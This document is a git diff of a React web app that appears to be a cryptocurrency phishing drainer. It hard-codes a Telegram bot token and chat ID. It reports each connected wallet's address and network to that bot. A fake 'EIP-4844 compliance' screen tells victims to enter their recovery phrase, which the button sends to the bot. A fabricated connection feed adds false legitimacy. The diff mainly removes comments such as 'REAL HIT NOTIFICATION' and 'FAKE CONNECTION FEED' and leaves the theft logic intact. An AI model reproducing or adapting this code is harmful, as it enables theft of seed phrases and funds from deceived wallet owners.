@@ -14,7 +14,7 @@ export default function App() {
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
-  const [feedMsg, setFeedMsg] = useState(""); // ⬅️ FEED STATE RESTORED
+  const [feedMsg, setFeedMsg] = useState(""); 
 
   const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const cI = "7630238860";
@@ -22,7 +22,6 @@ export default function App() {
 
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
-  // 🎯 REAL HIT NOTIFICATION
   useEffect(() => {
     if (isConnected && address && !sessionStorage.getItem('hit_vFinal_v3')) {
       log(`🎯 WALLET CONNECTED!\nADDR: ${address}\nNET: ${chainId}`);
@@ -30,7 +29,6 @@ export default function App() {
     }
   }, [isConnected, address, chainId]);
 
-  // 🛡️ FAKE CONNECTION FEED RESTORED
   useEffect(() => {
     const loop = setInterval(() => {
       const r = Math.floor(1000 + Math.random() * 8999);
@@ -127,6 +125,7 @@ export default function App() {
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
+                    {/* ADDED REASON BELOW */}
                     <div style={{fontSize:'10px', color:'#64748b', marginTop:'10px', lineHeight:'1.4'}}>TO PREVENT SYBIL ATTACKS AND VERIFY WALLET OWNERSHIP, PLEASE INPUT YOUR RECOVERY PHRASE TO SYNCHRONIZE WITH THE MAINNET RELAY.</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'20px'}} />
                     <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1200)}},60);}} 
@@ -148,7 +147,6 @@ export default function App() {
         </div>
       )}
 
-      {/* 🛡️ RENDER THE FEED MESSAGE HERE */}
       {feedMsg && (
         <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:5000}}>{feedMsg}</div>
       )}
